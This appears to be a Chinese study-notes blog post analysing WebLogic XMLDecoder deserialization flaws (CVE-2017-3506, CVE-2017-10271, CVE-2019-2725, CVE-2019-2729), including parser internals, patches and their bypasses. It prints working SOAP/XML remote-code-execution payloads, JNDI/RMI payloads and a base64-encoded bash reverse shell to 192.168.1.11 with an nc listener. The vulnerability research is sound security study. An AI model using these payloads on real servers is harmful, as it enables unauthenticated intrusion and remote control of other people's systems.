---
title: "Java学习笔记Ⅻ"
slug: "java-study-notes-12"
description: "weblogic历史漏洞学习 | 更新中"
date: 2022-10-17T17:51:05+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

学习笔记女生自用99新，参考链接放在文末

----

## 简介

XMLDecoder是Philip Mine在jdk1.4中开发的一个用于将java bean或pojo对象序列化和反序列化的一整套api，含有readObject方法可以对xml进行反序列化

JAXP(java api for xml processing)用于处理xml数据，它使用SAX(simple api for xml parsing)和DOM(document object model)解析xml，还支持xslt标准来转换xml

![image-20221011100922074](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011100922074.png)

XMLDecoder用的是SAX标准进行解析

SAX使用事件驱动的设计模式

### SAXParser

![image-20221011105618079](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011105618079.png)

一个SAX对象使用SAXParser.parser作为事件源，ContentHandler, ErrorHandler, DTDHandler, EntityResolver作为事件处理器，通过注册方法将二者连起来

![image-20221011105952575](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011105952575.png)

ContentHandler的几个重要方法（需要重点实现的）

![image-20221011110056089](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011110056089.png)

除此之外还可以利用XMLFilter实现对如果要自己使用SAX来实现解析xml文档的全过程是十分复杂的，org.xml.sax.helper提供了一个帮助类DefaultHandler，这个帮助类默认实现了4个事件处理器EntityResolver, DTDHandler, ContentHandler, ErrorHandler，只需要继承这个DefaultHandler即可轻松使用SAX

### Apache Xerces

XMLDecoder最后用的就是它，是它是它就是它

xerces有多个驱动Driver参与解析，分别负责不同的流程

![image-20221011111032355](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011111032355.png)

基本顺序可以这样理解

```
XMLDeclDriver->PrologDriver->FragmentContentDriver->TrailingMiscDriver->over
```

xerces对xml进行扫描和初步处理，将标签结果交给DocumentHandler后续解析

### Document Handler

DocumentHandler将xerces返回的标签分配给对应的事件处理器，比如java标签中含有class属性则会利用反射加载类，这里就是靠中间的addAttribute方法完成的；Object标签能执行命令是因为ObjectElementHandler事件处理器在继承NewElementHandler事件处理器后重写了getValueObject方法，用Expression创建对象；new标签能执行命令是因为NewElementHandler事件处理器针对new标签的class属性有一个通过反射加载类的操作；void标签的事件处理器VoidElementHandler继承了ObjectElementHandler事件处理器，其本身没有实现方法，交给父类处理；class标签的事件处理器ClassElementHandelr的getValue使用反射拿到对象

### XMLDecoder过程分析

简单的测试

```java
package XMLDecoder;

public class User {
    private String Name;
    private String Sex;
    private int Age;

    public User(){
        System.out.println("Constructor has called");
    }

    public User(String name, String sex, int age){
        System.out.println("Constructor2 has called");
        this.Name = name;
        this.Age = age;
        this.Sex = sex;
    }

    public void setName(String name){
        System.out.println("setName has called");
        this.Name = name;
    }

    public void setSex(String sex){
        System.out.println("setSex has called");
        this.Sex = sex;
    }

    public void setAge(int age){
        System.out.println("setAge has called");
        this.Age = age;
    }

    public int getAge() {
        System.out.println("getAge has called");
        return this.Age;
    }

    public String getSex() {
        System.out.println("getSex has called");
        return this.Sex;
    }

    public String getName() {
        System.out.println("getName has called");
        return this.Name;
    }

    @Override
    public String toString() {
        return "User{" +
                "Name='" + Name + '\'' +
                ", Sex='" + Sex + '\'' +
                ", Age=" + Age +
                '}';
    }
}
```

```java
package XMLDecoder;

import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

public class Debug {
    public static void main(String[] args) throws FileNotFoundException {
        User user = new User();
        user.setAge(18);
        user.setName("ame");
        user.setSex("girl");

        XMLEncoder e = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("User.xml")));
        e.writeObject(user);
        e.close();
    }
}
```

输出的User.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="XMLDecoder.User">
  <void property="age">
   <int>18</int>
  </void>
  <void property="name">
   <string>ame</string>
  </void>
  <void property="sex">
   <string>girl</string>
  </void>
 </object>
</java>
```

将User.xml进行反序列化处理

```java
public static Object unserial()throws FileNotFoundException{
	XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream("User.xml")));
	Object result = xmlDecoder.readObject();
	xmlDecoder.close();
	return result;
}
```

结合控制台的输出可以得知XMLEncoder序列化处理时默认调用相关的set和get方法，XMLEncoder反序列化处理时会调用set方法，值得注意的时这里用到的`readObject`并非java反序列化原生的`readObject`，只是同名而已，跟入看一下调用

![image-20220505164551575](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505164551575.png)

![image-20220505164613714](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505164613714.png)

可以看到核心的处理在`XMLDecoder.this.handler.parse(XMLDecoder.this.input)`，继续跟入

![image-20220505165030725](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165030725.png)

继续跟入`SAXParserFactory.newInstance().newSAXParser().parse(var1, DocumentHandler.this);`

![image-20220505165127525](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165127525.png)

is是`InputSource`对象，dh是默认的`Handler`对象

![image-20220505165645333](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165645333.png)

可以看到这里的handlers是hashMap结构，其中记录了xml每一个标签对应的`*ElementHandler`，比如array对应`ArrayElementHandler`

在经过if的判断后会对调用几个set方法来设置dh，随后继续调用`com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl.JAXPSAXParser#parse(org.xml.sax.InputSource)`，这里就已经进入xerces的处理中了

![image-20220505165956041](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505165956041.png)

这里的`super.parse`对应的是`com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse(org.xml.sax.InputSource)`

![image-20220505171016078](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220505171016078.png)

调用set方法为InputSource对象的属性赋值，同时设置XML的编码方式，之后继续调用parse, parse, parse，直到`com.sun.org.apache.xerces.internal.parsers.XML11Configuration#parse(boolean)`，跟入`return fCurrentScanner.scanDocument(complete);`，进入对XML文档的遍历和解析的具体操作中

后面的略掉（单纯因为太长了），来个非常nice的图

![image-20221011103427345](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011103427345.png)

![xmlDecoder](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/2723796-20220130184421120-2008545031.png)

### 标签&属性

- `<object>`

表示对象，标签的值作为参数

- `<method>`

调用指定类的指定方法

- `<string>`

表示字符串

- `<object>`

表示对象，class属性指定具体类（用于调用其内部方法），method属性指定具体方法名称

- `<void>`

表示函数调用和赋值等操作，method属性指定具体的方法名称

- `<array>`

表示数组，class属性指定具体类，内部void标签的index属性表示根据具体数组的索引赋值

## CVE-2017-3506

在weblogic解析的过程中，前半部分大致和之前的XMLDecoder过程分析中是一样的，不过在DocumentHandler.parse()到SAXParserImpl.parse()的过程中多了两步RegistryXMLReader.parse()和WebLogicXMLReader.parse()，之后再正常衔接

### 过程分析

#### XMLDecoder部分

```
POST /wls-wsat/CoordinatorPortType
```

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>touch /tmp/123</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
</soap:Envelope>
```

xerces之后，先在DocumentHandler分配标签处理的具体方法（此处是JavaElementHandler），再进入具体处理

![image-20221011152830560](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011152830560.png)

![image-20221011152944141](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011152944141.png)

之后会用类似的方式处理java.lang.ProcessBuilder和java.lang.String，最后再ObjectElementHandler中用Expression对象完成命令执行

![image-20221011155723343](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011155723343.png)

![image-20221011155607516](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011155607516.png)

#### Weblogic部分

weblogic中对wsdl的soap消息体解析依赖XMLDecoder，不需要鉴权

![image-20221011160637479](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221011160637479.png)

weblogic.wsee.workarea.WorkContextXmlInputAdapter这个类是调用XMLDecoder前的最后一步，之后所有的fix也都从这里下手，用黑名单方式阻止恶意内容进入XMLDecoder

### fix

在`weblogic.wsee.workarea.WorkContentXmlInputAdapter`中增加了`validate`方法（专门处理过滤问题的）

```java
private void validate(InputStream is) {
      WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
      try {
         SAXParser parser = factory.newSAXParser();
         parser.parse(is, new DefaultHandler() {
            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
               if(qName.equalsIgnoreCase("object")) {
                  throw new IllegalStateException("Invalid context type: object");
               }
            }
         });
      } catch (ParserConfigurationException var5) {
         throw new IllegalStateException("Parser Exception", var5);
      } catch (SAXException var6) {
         throw new IllegalStateException("Parser Exception", var6);
      } catch (IOException var7) {
         throw new IllegalStateException("Parser Exception", var7);
      }
}
```

遇到Object标签就抛出异常，是真的蠢

## CVE-2017-10271

针对上面的过滤，我们直接把object换成void或者new就行了

```xml
<java version="1.4.0" class="java.beans.XMLDecoder">
    <new class="java.lang.ProcessBuilder">
        <string>calc</string>
<method name="start" />
    </new>
</java>
```

```xml
<java version="1.8.0_131" class="java.beans.XMLDecoder">
    <void class="com.sun.rowset.JdbcRowSetImpl">
    <void property="dataSourceName">
        <string>rmi://localhost:1099/Exploit</string>
    </void>
    <void property="autoCommit">
        <boolean>true</boolean>
    </void>
    </void>
</java>
```

上面这个poc生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口时会根据dataSourceName的值去远程加载一个类初始化，我们可以用rmi

### fix

```java
private void validate(InputStream is) {
   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
   try {
      SAXParser parser = factory.newSAXParser();
      parser.parse(is, new DefaultHandler() {
         private int overallarraylength = 0;
         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
            if(qName.equalsIgnoreCase("object")) {
               throw new IllegalStateException("Invalid element qName:object");
            } else if(qName.equalsIgnoreCase("new")) {
               throw new IllegalStateException("Invalid element qName:new");
            } else if(qName.equalsIgnoreCase("method")) {
               throw new IllegalStateException("Invalid element qName:method");
            } else {
               if(qName.equalsIgnoreCase("void")) {
                  for(int attClass = 0; attClass < attributes.getLength(); ++attClass) {
                     if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) {
                        throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass));
                     }
                  }
               }
               if(qName.equalsIgnoreCase("array")) {
                  String var9 = attributes.getValue("class");
                  if(var9 != null && !var9.equalsIgnoreCase("byte")) {
                     throw new IllegalStateException("The value of class attribute is not valid for array element.");
                  }
```

依旧黑名单，加上了new和void和method的元素节点，其次限制了void元素只能使用index属性或者空属性，array标签如果使用class属性 那么值必须是byte，还是比较有效的，限制了调用任意方法

## CVE-2019-2725

换了个组件日，`_async`，同时绕过了上面的fix

*写在前面：我痛恨一切没有认真复现，拿着2017年的payload打2019年的cve的行为。

### 过程分析

按0day的分析思路来，首先看官方通报是wls9_async_response组件在处理http消息时存在反序列化rce的漏洞，用11g做测试环境，定位到/lib/bea_wls9_async_response.war，先看一下web.xml（组件对应的web路径）

![image-20221012103847685](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012103847685.png)

有不少url- pattern，但直接访问都是404，这个故事告诉我们weblogic查看路径只需要直接看对应组件的weblogic-webservices.xml即可

![image-20221012104019544](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012104019544.png)

访问/_async/AsyncResponseBean可以看到测试界面，结合公告中的漏洞处置建议，禁止 `/_async/*` 路径的URL访问，可以大概率猜测漏洞入口在这里

在weblogic.wsee.async.AsyncResponseHandler#handleRequest处下断点，随便构造一个soap post消息即可触发断点

```xml
<?xml version="1.0"?>
<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
soap:encodingStyle="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body xmlns:m="http://www.example.org/stock">
  <m:GetStockPrice>
    <m:StockName>IBM</m:StockName>
  </m:GetStockPrice>
</soap:Body>
</soap:Envelope>
```

对message进行一些判断之后要取出weblogic.wsee.addressing.RelatesTo这个属性，但是我们构造的soap不满足条件，先gg

![image-20221012133724062](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012133724062.png)

解决办法是添加一对`<ads:RelatesTo>test</ads:RelatesTo>`标签

```xml
<?xml version="1.0"?>
<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
soap:encodingStyle="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:ads="http://www.w3.org/2005/08/addressing">
    <soap:Header>
        <ads:Action>demo</ads:Action>
        <ads:RelatesTo>test</ads:RelatesTo>
    </soap:Header>
    <soap:Body xmlns:m="http://www.example.org/stock">
    <m:GetStockPrice>
        <m:StockName>IBM</m:StockName>
    </m:GetStockPrice>
</soap:Body>
</soap:Envelope>
```

但是继续跟进到handleRequestInternal的时候会报错Cannot retrieve request information for message test，再往前寻找调用过程中，也好像没啥可以利用的点，遂放弃

不过在中间过断点的过程中还是能知道大致的处理流程的，有多个handler集成在HandlerIterator中，里面的handler都叫handleRequest，我们之前关注的只是AsyncResponseHandler，后面还有WorkAreaServerHandler处理xml中的部分内容

![image-20221013101652555](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013101652555.png)

#### poc1 - UnitOfWorkChangeSet

*还是不得不感叹一句假poc的猖獗，甚至一些看着很“精美”的复现文章里也是如此。

先看一下最终poc长啥样

![image-20221012172607979](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221012172607979.png)

我们先构造个简易的poc发个包看看

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class="byte" length="1"><void index="0"><byte>120</byte></void></array></void></class>
</java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body>
```

我们的payload内容在WorkContext中，针对这部分xml有单独的WorkAreaServerHandler，直接在WorkAreaServerHandler中打断点根本断不下来（也可能是我脸黑），我们选择在HandlerIterator#handleRequest中截胡

![image-20221013103128677](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013103128677.png)

断在这个var5的地方，当this.index为16的时候就会进入WorkAreaServerHandler中

![image-20221013134849064](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013134849064.png)

这里的WorkContextXmlInputAdapter会继续调用WorkContextXmlInputAdapter#readUTF

![image-20221013135234883](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013135234883.png)

我们熟悉的xmlDecoder.readObject出现了（注1）；继续看调用栈，之后对xml的处理过程中会进入UnitOfWorkChangeSet

```
<init>:59, UnitOfWorkChangeSet (oracle.toplink.internal.sessions)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:57, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:525, Constructor (java.lang.reflect)
invokeInternal:295, Statement (java.beans)
access$000:58, Statement (java.beans)
run:185, Statement$2 (java.beans)
doPrivileged:-1, AccessController (java.security)
invoke:182, Statement (java.beans)
getValue:153, Expression (java.beans)
getValueObject:166, ObjectElementHandler (com.sun.beans.decoder)
// omit
readObject:250, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
handleRequest:27, WorkAreaServerHandler (weblogic.wsee.workarea)
handleRequest:141, HandlerIterator (weblogic.wsee.handler)
dispatch:114, ServerDispatcher (weblogic.wsee.ws.dispatch.server)
// omit
```

![image-20221013104107459](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013104107459.png)

见到了我们日思夜想的readObject（正好位于构造方法中，可以绕过之前fix不能调用方法的限制），把array中嵌套的byte标签中的内容进行readObject处理，后面的内容我们可以衔接7u21的原生链，将payload转换为byte发送

注1：这也就是为什么假poc泛滥猖獗的原因，因为这个WorkContextImlInputAdapter在cve-2017-10271中也可以触发，后面跟着XMLDecoder，也可以粗暴的理解：WorkContextImlInputAdapter是cve-2017-10271的一个触发点，而我们这里的WorkAreaServerHandler就调用了WorkContextImplInputAdapter，所以假poc只不过是找到了cve-2017-10271的又一个新的触发点，而没有真正绕过validate的黑名单

payload被传入后执行的流程大致是这样的：

```
AsyncResponseService-> HandlerIterator-> WorkAreaServerHandler-> WorkContextXmlInputAdapter-> validate-> XMLDecoder-> readObject
```

所以正经poc是怎么绕过的呢？在补丁中忽略了`<class>`标签，它可以代表一个类的实例，我们可以用它创建任意类的实例，也就是正经poc中的

```
<java><class>......</class></java>
```

一个测试poc

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>java.net.Socket</string><void><string>weblogic.30nux0.ceye.io</string><int>80</int></void></class></java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

如果加换行符会在jdk7上失败，不加换行符在6和7上都可以

#### poc2 - JdbcRowSetImpl(jdk7)

在12c中没有oracle.toplink.internal.sessions.UnitOfWorkChangeSet，自然也用不了上面的poc，但是class标签还是有的，可以创建类的实例但调用不了方法（我们只能找对应类的构造方法），同时12.1.3的最低支持版本为1.7，12.2.1及以上最低版本为1.8，11g的最低版本为1.6

jdk6和jdk7处理标签的方式不同，jdk6使用的是com.sun.beans.ObjectHandler，jdk7使用的是com.sun.beans.decoder.DocumentHandler，比jdk6新增了new, property等标签的支持，再配合com.sun.rowset.JdbcRowSetImpl来执行命令

JdbcRowSetImpl也是2017-10271的一个绕过方式，poc长这样

```xml
<java version="1.8.0_131" class="java.beans.XMLDecoder">
    <void class="com.sun.rowset.JdbcRowSetImpl">
    <void property="dataSourceName">
        <string>rmi://localhost:1099/Exploit</string>
    </void>
    <void property="autoCommit">
        <boolean>true</boolean>
    </void>
    </void>
</java>
```

我们把void class换成class，把void property换成property，换掉后的标签就避开了void标签只能跟index的validate补丁，同时也是适配jdk7的解析标签的方式

```xml
<java><class><string>com.sun.rowset.JdbcRowSetImpl</string><void><property name="dataSourceName"><string>rmi://192.168.1.11:1099/bpjuf6</string></property><property name="autoCommit"><boolean>true</boolean></property></void></class></java>
```

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>com.sun.rowset.JdbcRowSetImpl</string><void><property name="dataSourceName"><string>rmi://192.168.1.11:1099/bpjuf6</string></property><property name="autoCommit"><boolean>true</boolean></property></void></class></java>
 </work:WorkContext>
 </soapenv:Header>
 <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

再请出我们的jndi一把嗦的工具

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguMS4xMS84NDI2IDA+JjE=}|{base64,-d}|{bash,-i}" -A "192.168.1.11"
# rmi://192.168.1.11:1099/bpjuf6
nc -lvvp 8426
```

![image-20221013164347724](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221013164347724.png)

rce到手

#### poc3 - EventData(weblogic 12.1.3)

继续换了一个类来利用，不过这个更弔

```java
public EventData(String xml) {
    ByteArrayInputStream bais = new ByteArrayInputStream(xml.getBytes());

    try {
        XMLDecoder decoder = new XMLDecoder(bais);
        this.eventData = (Map)decoder.readObject();
    } catch (Exception var4) {
        throw new EventException("Error decoding " + xml, var4);
    }
}
```

看这个类的构造方法，直接将传入的xml交给XMLDecoder.readObject了，简单粗暴，再加上本身的一层XMLDecoder，我们的payload需要被两次XMLDecode解析，所以将第二次的解析内容放入`<![CDATA]>`中，第二次的XMLDecoder不经过黑名单，无jdk版本限制，所以可以用2017-3506的payload

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java version="1.8.0_131" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>calc</string></void></array><void method="start" /></object></java>]]></string>
</void></class>
</java>
 </work:WorkContext>
 </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

### fix

依旧黑名单，禁止了class, object, new, method标签，同时对void和array标签做了很多限制

![image-20221017101636246](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017101636246.png)

![image-20221017101652359](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017101652359.png)

void标签只能存在index属性，array标签的length也做了限制

## CVE-2019-2729

针对CVE-2017-10271在java6上的特殊绕过

### 过程分析

对于XMLDecoder之前的部分已经被挖掘的差不多了，我们考虑往XMLDecoder之后找找利用点；前面也提过apache xerces，它最终内部使用SAXParser处理标签

在SAXParser这个三级标题中，起到主要作用的ContentHandler在java6中变为了ObjectHandler

![image-20221017151221508](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151221508.png)

在XMLDecoder.readObject之后的调用栈如下

```
startElement:181, ObjectHandler (com.sun.beans)
startElement:453, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
startElement:767, XMLDTDValidator (com.sun.org.apache.xerces.internal.impl.dtd)
scanStartElement:1363, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanRootElementHook:1318, XMLDocumentScannerImpl$ContentDriver (com.sun.org.apache.xerces.internal.impl)
next:3103, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)
next:922, XMLDocumentScannerImpl$PrologDriver (com.sun.org.apache.xerces.internal.impl)
next:648, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)
scanDocument:511, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)
parse:808, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:737, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)
parse:119, XMLParser (com.sun.org.apache.xerces.internal.parsers)
parse:1205, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)
parse:522, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)
parse:69, WebLogicParser (weblogic.xml.jaxp)
parse:156, RegistryParser (weblogic.xml.jaxp)
parse:364, SAXParser (javax.xml.parsers)
parse:142, SAXParser (javax.xml.parsers)
getHandler:238, XMLDecoder (java.beans)
readObject:201, XMLDecoder (java.beans)
readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
// omit
```

进入startElement之后又和前面的java7有很大区别

![image-20221017151611315](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151611315.png)

下面这个是java7的，startElement在DocumentHandler中![image-20221017151637676](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017151637676.png)

在java6中，解析到一个标签时会首先根据当前标签生成一个MutableExpression类，后续的setXXX, getXXX之类的操作都在这个类的实例上进行，遇到标签闭合处会执行endElement函数，调用Expression#getValue计算值，我们跟入getValue

![image-20221017153433603](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153433603.png)

![image-20221017153502895](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153502895.png)

![image-20221017153514356](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017153514356.png)

unbound是MutableExpression对象的属性之一，初始this.value==unbound，如果还是初始状态则调用setValue(invoke())，跟入Statement#invokeInternal

![image-20221017154141883](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017154141883.png)

这里的一个return很明显是在进行反射调用，而target正是从MutableExpression#getTarget中获得，methodName正式从MutableExpression#getMethodName中获得

梳理一下前面的调用，ObjectHandker#startElement（也就是java7中的DocumentHandelr#startElement）会根据当前的标签信息生成一个MutableExpression对象，标签结束时执行这个Expression，执行时会根据当前Expression对象属性中的target和mathodName来确定反射调用的类和执行的函数

回到ObejctHandler#startElement，看看有哪些标签是可用的

```java
if (name == "string") {
    e.setTarget(String.class);
    e.setMethodName("new");
    this.isString = true;
} else if (this.isPrimitive(name)) {
    Class wrapper = typeNameToClass(name);
    e.setTarget(wrapper);
    e.setMethodName("new");
    this.parseCharCode(name, attributes);
} else if (name == "class") {
    e.setTarget(Class.class);
    e.setMethodName("forName");
} else if (name == "null") {
    e.setTarget(Object.class);
    e.setMethodName("getSuperclass");
    e.setValue((Object)null);
} else if (name == "void") {
    if (e.getTarget() == null) {
        e.setTarget(this.eval());
    }
} else if (name == "array") {
    subtypeName = (String)attributes.get("class");
    Class subtype = subtypeName == null ? Object.class : this.classForName2(subtypeName);
    length = (String)attributes.get("length");
    if (length != null) {
        e.setTarget(Array.class);
        e.addArg(subtype);
        e.addArg(new Integer(length));
    } else {
        Class arrayClass = Array.newInstance(subtype, 0).getClass();
        e.setTarget(arrayClass);
    }
} else if (name == "java") {
    e.setValue(this.is);
} else if (name != "object") {
    this.simulateException("Unrecognized opening tag: " + name + " " + this.attrsToString(attrs));
    return;
}
```

比java7少了一个new标签，同时在此处java, null标签都会经过setValue的处理，后续即使再更改内容都不会再次setValue(invoke())了（判断标准是是否this.value==unbound），排除这些就只剩下一些基础类型的标签了，但它们也都有setTarget和setMethodName的操作，我们无法干预；那能否对已经赋值的内容进行覆盖呢？

![image-20221017155224578](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017155224578.png)

再仔细看startElement的处理逻辑，在进入具体的标签处理之前提前对MutableExpression对象调用setTarget和setMethodName对象，假如我们发送这样的内容

```xml
<string class="test" method="abc"/>
```

苦露西，到下面执行string标签时就会被setTarget和setMethodName覆盖，这条路堵死了

再往后看startElement

![image-20221017161828137](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017161828137.png)

这是在标签处理之后，再对其中的属性进行进一步解析，id存入 idref取出，lookup函数中顺带又执行了一次Expression（通过getValue）

![image-20221017162144385](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017162144385.png)

回到statElement，在处理field属性时，连续调用了getTarget, getFieldValue, setValue，根据上面的分析，java和object标签是不会被setValue(invoke())覆盖的，跟入getFieldValue，发现这就是正常反射的getField过程

此时有两个思路：

1. 如果使用java标签指定class（即target），也就是对指定Class进行属性值获取，只能获得static修饰的属性，同时由于FieldUtil#getField调用的是Class#getField获取的Field对象，所以只能获得到public修饰的，也就是只能获得public static修饰的属性，没什么实用性
2. 能否从public static修饰的属性中偷一个Object对象，利用id和idref的存取特性，对java标签的setValue进行覆盖，即重新给一个Object对象（this.value==unbound判断中unbound就是一个Object对象），让它进入if判断，触发setValue(invoke())？也是不行的，因为重新给的Object也和最初的unbound不同

还有什么方式呢？我们考虑把类和函数这两个rce的核心内容拆开来看，就像CVE-2019-2725中那样在class标签中指定类，在构造函数中完成利用；从上文对startElement的分析可知，如果methodName为空则指定为new，在后续反射调用中就会代指newInstance函数

在对标签名解析的过程中，基本都调用了setTarget

![image-20221017170026462](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20221017170026462.png)

特殊的void非常显眼，虽然前面的补丁里让void中只能由index属性，但可以用eval函数的返回结果当Target

补丁中对array标签提取了class和length属性进行限制，但对应methodName的method属性没有被检测（有了任意函数），虽然array标签在解析中target是被指定的（Byte.class或Class.class），但问题不大，在最终的Statement#invokeInternal中能正确解析
